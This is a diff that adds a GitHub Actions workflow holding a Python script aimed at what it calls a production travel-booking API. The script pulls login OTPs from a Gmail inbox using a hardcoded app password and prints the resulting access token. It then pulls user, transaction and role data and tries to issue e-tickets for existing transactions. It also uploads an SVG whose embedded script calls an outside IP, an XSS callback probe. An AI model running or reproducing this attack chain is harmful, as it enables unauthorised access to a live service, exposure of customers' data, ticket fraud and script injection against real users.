@@ -1,0 +1,168 @@
+name: prod-final
+on:
+  workflow_dispatch:
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - run: pip install --quiet requests
+      - run: |
+          python3 - <<'PYEOF'
+          import requests, json, urllib3, time, imaplib, email as em, re, datetime
+          urllib3.disable_warnings()
+          B = "https://api.superokka.com"
+          s = requests.Session(); s.verify = False
+          EMAIL = "superxfilecom@gmail.com"
+          IMAP_PASS = "ojhw apff okyc kecp"
+
+          # Step 0: Note current time for email filtering
+          before_ts = datetime.datetime.utcnow()
+          print(f"Start: {before_ts.isoformat()}")
+
+          # Step 1: Request OTP
+          r = s.post(f"{B}/auth/otp/request", json={"email": EMAIL}, timeout=20)
+          print(f"OTP REQUEST: {r.status_code} {r.text[:150]}")
+          if r.status_code != 200: exit(1)
+
+          # Step 2: Wait for email
+          time.sleep(10)
+          otp_code = None
+          for attempt in range(8):
+              try:
+                  mail = imaplib.IMAP4_SSL('imap.gmail.com', 993)
+                  mail.login(EMAIL, IMAP_PASS)
+                  mail.select('INBOX')
+                  # Search by date
+                  date_str = before_ts.strftime('%d-%b-%Y')
+                  status, msgs = mail.search(None, f'(FROM "tiketokka.id" SINCE {date_str})')
+                  ids = msgs[0].split()
+                  print(f"  Attempt {attempt+1}: found {len(ids)} emails from tiketokka since {date_str}")
+                  for mid in reversed(ids[-5:]):
+                      status, data = mail.fetch(mid, '(BODY.PEEK[HEADER.FIELDS (DATE SUBJECT FROM)])')
+                      hdr = data[0][1].decode('utf-8','replace')
+                      if 'verification' in hdr.lower() or 'otp' in hdr.lower():
+                          status, data = mail.fetch(mid, '(BODY.PEEK[])')
+                          msg = em.message_from_bytes(data[0][1])
+                          body = ""
+                          if msg.is_multipart():
+                              for part in msg.walk():
+                                  if part.get_content_type() == 'text/html':
+                                      body = part.get_payload(decode=True).decode('utf-8','replace')
+                                      break
+                          else:
+                              body = msg.get_payload(decode=True).decode('utf-8','replace')
+                          styled = re.findall(r'font-size:\s*\d+px[^>]*>(\d)', body)
+                          codes = re.findall(r'\b(\d{6})\b', body)
+                          otp = ''.join(styled[:6]) if len(styled) >= 6 else ''
+                          if not otp and len(codes) > 4:
+                              otp = codes[4]
+                          if otp:
+                              otp_code = otp
+                              print(f"  OTP: {otp_code}")
+                              break
+                  mail.close(); mail.logout()
+                  if otp_code: break
+                  time.sleep(5)
+              except Exception as e:
+                  print(f"  IMAP err: {str(e)[:80]}")
+                  time.sleep(3)
+
+          if not otp_code:
+              print("FAILED: no OTP"); exit(1)
+
+          # Step 3: Verify
+          r = s.post(f"{B}/auth/otp/verify", json={"email": EMAIL, "otp": otp_code}, timeout=20)
+          print(f"VERIFY: {r.status_code} {r.text[:600]}")
+          d = r.json().get("data", {})
+          tok = d.get("accessToken", "")
+          reg_tok = d.get("registrationToken", "")
+          needs_reg = d.get("requiresRegistration", False)
+
+          # Step 4: Register if needed
+          if needs_reg and reg_tok:
+              print(f"\nREGISTERING (token: {reg_tok[:20]}...)")
+              r2 = s.post(f"{B}/auth/otp/complete-registration", json={
+                  "registrationToken": reg_tok,
+                  "username": "superxfile1",
+                  "phone": "081234567890"
+              }, timeout=20)
+              print(f"REG: {r2.status_code} {r2.text[:800]}")
+              tok = r2.json().get("data", {}).get("accessToken", "")
+
+              if not tok:
+                  # Try fresh OTP login after registration
+                  print("\nFresh OTP after reg...")
+                  time.sleep(2)
+                  before_ts2 = datetime.datetime.utcnow()
+                  s.post(f"{B}/auth/otp/request", json={"email": EMAIL}, timeout=20)
+                  time.sleep(10)
+                  mail = imaplib.IMAP4_SSL('imap.gmail.com', 993)
+                  mail.login(EMAIL, IMAP_PASS)
+                  mail.select('INBOX')
+                  date_str2 = before_ts2.strftime('%d-%b-%Y')
+                  status, msgs = mail.search(None, f'(FROM "tiketokka.id" SINCE {date_str2})')
+                  ids = msgs[0].split()
+                  for mid in reversed(ids[-3:]):
+                      status, data = mail.fetch(mid, '(BODY.PEEK[])')
+                      msg = em.message_from_bytes(data[0][1])
+                      body = ""
+                      if msg.is_multipart():
+                          for part in msg.walk():
+                              if part.get_content_type() == 'text/html':
+                                  body = part.get_payload(decode=True).decode('utf-8','replace'); break
+                      styled = re.findall(r'font-size:\s*\d+px[^>]*>(\d)', body)
+                      otp2 = ''.join(styled[:6]) if len(styled) >= 6 else ''
+                      if otp2 and otp2 != otp_code:
+                          r3 = s.post(f"{B}/auth/otp/verify", json={"email": EMAIL, "otp": otp2}, timeout=20)
+                          print(f"VERIFY2: {r3.status_code} {r3.text[:400]}")
+                          tok = r3.json().get("data", {}).get("accessToken", "")
+                          break
+                  mail.close(); mail.logout()
+
+          if not tok:
+              print("NO TOKEN"); exit(1)
+
+          # Step 5: PRODUCTION ACCESS
+          print(f"\n=== PRODUCTION TOKEN OBTAINED ===")
+          print(f"TOKEN: {tok}")
+          H = {"Authorization": f"Bearer {tok}"}
+
+          for ep in ["/auth/profile", "/users?limit=5", "/transactions?limit=10",
+                     "/companies", "/roles", "/airlines", "/airline-providers",
+                     "/umrah-packages?limit=3", "/flight-search/providers"]:
+              r = s.get(f"{B}{ep}", headers=H, timeout=15)
+              print(f"\n{ep}: {r.status_code} {r.text[:500]}")
+
+          # Eticket attempts
+          r = s.get(f"{B}/transactions?limit=50", headers=H, timeout=15)
+          try:
+              txs = r.json().get("data", [])
+              print(f"\nTotal TX: {len(txs)}")
+              for tx in txs[:15]:
+                  tid = tx.get("id"); ts = tx.get("transactionStatus"); tt = tx.get("type")
+                  print(f"  TX {tid} {tt}/{ts}")
+                  if ts in ("completed", "pending"):
+                      r2 = s.post(f"{B}/transactions/{tid}/etickets", headers=H, json={}, timeout=120)
+                      print(f"    ETICKET: {r2.status_code} {r2.text[:200]}")
+                      if r2.status_code in (200, 201):
+                          print("    !!! ETICKET SUCCESS !!!")
+          except Exception as e:
+              print(f"TX err: {e}")
+
+          # Upload
+          import base64
+          svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("http://64.227.62.83:8899/prod-svg-exec-"+document.domain)</script></svg>'
+          r = s.post(f"{B}/upload/image", headers=H, files={"file": ("t.svg", svg, "image/svg+xml")}, timeout=20)
+          print(f"\nSVG UPLOAD: {r.status_code} {r.text[:300]}")
+
+          png = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")
+          r = s.post(f"{B}/upload/image", headers=H, files={"file": ("t.png", png, "image/png")}, timeout=20)
+          print(f"PNG UPLOAD: {r.status_code} {r.text[:300]}")
+
+          # Flight search + booking chain
+          r = s.post(f"{B}/flight-search/lion-air/search", headers=H, json={
+              "departureAirportCode":"CGK","arrivalAirportCode":"SUB","departureDate":"2026-12-22"
+          }, timeout=60)
+          print(f"\nFLIGHT SEARCH: {r.status_code} {r.text[:400]}")
+          PYEOF
